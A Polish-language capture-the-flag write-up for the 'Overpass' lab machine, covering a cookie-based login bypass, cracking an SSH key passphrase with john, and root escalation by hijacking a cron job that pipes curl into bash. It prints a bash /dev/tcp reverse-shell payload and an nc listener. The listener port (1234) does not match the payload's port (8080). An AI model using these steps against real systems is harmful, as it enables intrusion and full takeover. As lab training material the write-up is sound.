# Overpass

Pokój który uczy analizowania aplikacji webowych i wykorzystywania błędów logicznych do zdobycia dostępu. 
W drugiej części pokazuje, jak niewłaściwie skonfigurowany cron może prowadzić do eskalacji uprawnień w systemie Linux.

## 1. Informacje ogólne
- **Cel testów:** Maszyna, która uczy analizowania uprawnień i wykorzystywania błędnych konfiguracji sudo.  
                  Zadanie prowadzi krok po kroku do zrozumienia, jak niewielkie misconfigi mogą otworzyć drogę do eskalacji uprawnień.    

---

## 2. Metodologia 
 **Narzędzia:** nmap , gobuster ,john
 
## 3. Podsumowanie zadania
  **Skanowanie wstępne:**
  
- skanowanie nmap
- wyszukujemy ukrutych katalogów gobusterem.
  
Gobusterem dostajemy jeden z katalog którym jest admin
Po wejściu mamy pole logowania 
W źródle strony otrzymujemy odnośnik login.js po kliknięciu w który dostajemy podpowiedź , że po ustawieniu na stronie ciasteczka z nazwą SessionToken 
i odświerzeniu dostajemy admina z kluczem ssh

Kopiuejmy do pliku i łączymy się przez ssh

Najpierw musimy odkryć haslo klucza ssh
```bash
ssh2john id > hash.txt
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

zmieniamy uprawnienia na chmod hash.txt 600

Dostajemy hasło do ssh
Po wejściu widzimy user.txt z flagą 

Teraz musimy podnieźć uprawnienai do root – eskalacja uprawnień

W drugim pliku txt dostajemy podpowiedź o uruchamianiu automatycznych skryptów
W linux mamy takie miejsce : 
```bash
/etc/crontab 
```
To plik, w którym system przechowuje zadania uruchamiane automatycznie o określonych godzinach, np.:
    • backupy,
    • czyszczenie logów,
    • skrypty administracyjne,
    • zadania cykliczne.
Dostajemy podpwiedź:

 Update builds from latest code
 root curl overpass.thm/downloads/src/buildscript.sh | bash

w pliku /etc/hosts dodajemy do overpass.thm ip naszej maszyny lokalnej ( potrzebne do reverse shella)

Tworzymy payload w pliku buildscript.sh
```html
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1


w folderze  usera do którego połączyliśmy się przez ssh w pliku /etc/hosts przypisujemy ip maszyny fizycznej pod overpass.thm

Na urządzeniu fizycznym tworzymy plik .sh w ścieżce  downloads/src/buildscript.sh
Uruchamiamy serwer http
```bash
sudo python3 -m http.server 80 
```
w drugim oknie nasluchujemy 
```bash
nc -lvnp 1234 – port i ip ustawione w .sh
```
Otrzymujemy reverse shell i odczytujemy root.txt


